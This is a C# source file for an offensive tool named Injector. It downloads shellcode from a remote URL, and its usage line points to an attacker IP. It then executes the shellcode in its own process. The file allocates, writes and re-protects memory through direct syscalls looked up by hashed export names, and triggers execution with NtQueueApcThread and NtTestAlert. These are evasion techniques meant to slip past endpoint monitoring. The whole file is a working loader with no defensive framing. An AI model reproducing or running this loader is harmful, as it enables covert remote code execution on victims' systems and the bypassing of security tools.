using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Injector
{
    class Program
    {

        static HookManager hm;

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetCurrentThread();

        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                printHelp();
                return;
            }

            string url = args[0];

            IntPtr hmodule = IntPtr.Zero;
            hm = new HookManager();

            DInvoke.Data.Native.UNICODE_STRING bb = new DInvoke.Data.Native.UNICODE_STRING();
            DInvoke.DynamicInvoke.Native.RtlInitUnicodeString(ref bb, @"c:\windows\system32\ntdll.dll");
            DInvoke.DynamicInvoke.Native.LdrLoadDll(IntPtr.Zero, 0, ref bb, ref hmodule);

            List<DInvoke.DynamicInvoke.EAT> eat = DInvoke.DynamicInvoke.Generic.GetExportAddressEx(hmodule);
            var dict = DInvoke.DynamicInvoke.EAT.ConvertToDict(eat);

            byte[] sc = new System.Net.WebClient().DownloadData(url);


            IntPtr baseAddr = IntPtr.Zero;
            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);
            Marshal.WriteIntPtr(lpValue, new IntPtr((long)sc.Length));


            var id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtAllocateVirtualMemory")];
            object[] allocate = { (IntPtr)(-1), baseAddr, IntPtr.Zero,lpValue,
                                  (uint)(DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Reserve | DInvoke.Data.Win32.Kernel32.MemoryAllocationFlags.Commit),
                                  (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ReadWrite };

            baseAddr = (IntPtr)Syscalls.executeSyscall(id, "NtAllocateVirtualMemory", allocate)[1];

            IntPtr buffer = Marshal.AllocHGlobal(sc.Length);
            Marshal.Copy(sc, 0, buffer, sc.Length);
            uint bytesWritten = 0;

            //hm.setScInfo(baseAddr, sc.Length);

            object[] write = { (IntPtr)(-1), baseAddr, buffer, (uint)sc.Length, bytesWritten };
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtWriteVirtualMemory")];
            DInvoke.DynamicInvoke.Native.NtWriteVirtualMemory((IntPtr)(-1), baseAddr, buffer, (uint)sc.Length);


            uint oldProtect = 0;
            object[] protection = { (IntPtr)(-1), baseAddr, lpValue, (uint)DInvoke.Data.Win32.Kernel32.MemoryProtectionFlags.ExecuteRead, oldProtect};
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtProtectVirtualMemory")];
            baseAddr = (IntPtr)Syscalls.executeSyscall(id, "NtProtectVirtualMemory", protection)[1];



            object[] apc = { GetCurrentThread(), baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero };
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtQueueApcThread")];
            Syscalls.executeSyscall(id, "NtQueueApcThread", apc);

            hm.Install(); //I just wanted to hook GetProcAddress


            object[] alert = {};
            id = dict[DInvoke.DynamicInvoke.EAT.GetSha256Hash("NtTestAlert")];
            Syscalls.executeSyscall(id, "NtTestAlert", alert);


        }

        private static void printHelp()
        {
            var help = "usage: Injector.exe https://<attackerIP>/shellcode.bin";
            Console.WriteLine(help);
        }
    }
}
